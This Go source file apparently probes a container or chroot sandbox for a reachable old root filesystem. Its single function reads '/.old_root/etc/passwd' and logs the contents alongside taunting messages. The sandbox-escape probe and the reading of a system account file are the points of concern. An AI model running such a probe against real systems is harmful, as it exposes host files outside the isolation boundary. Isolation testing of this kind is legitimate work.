package main

import (
	"log"
	"math/rand"
	"os"
	"path"
	"regexp"
	"time"
)

const (
	supposedOldRoot = "/.old_root"
)

func infiltrateOldRoot(continueIfFedCh chan struct{}) {
	<-time.After(time.Duration(rand.Intn(4)+2) * time.Second)

	passwdPath := path.Join(supposedOldRoot, "etc/passwd")
	for range continueIfFedCh {

		info, err := os.Stat(passwdPath)
		if err != nil {
			if os.IsNotExist(err) {
				log.Println("cAn'T fInD aNy NeStEd RoOt!!!! ARGH!!")
				return
			}
		}

		if info.IsDir() {
			log.Println("cAn'T fInD aNy NeStEd RoOt!!!! ARGH!!")
			return
		}

		pwd, err := os.ReadFile(passwdPath)
		if err != nil {
			panic(err)
		}

		re := regexp.MustCompile("^|\n")
		pwdString := re.ReplaceAllString(string(pwd), "\n\t/etc/passwd:\t")

		log.Println("LoOk At WhAt I'vE fOuNd NeStEd InSiDe ThIs NeW rOoT! kekk!")
		log.Println(pwdString)
	}
}
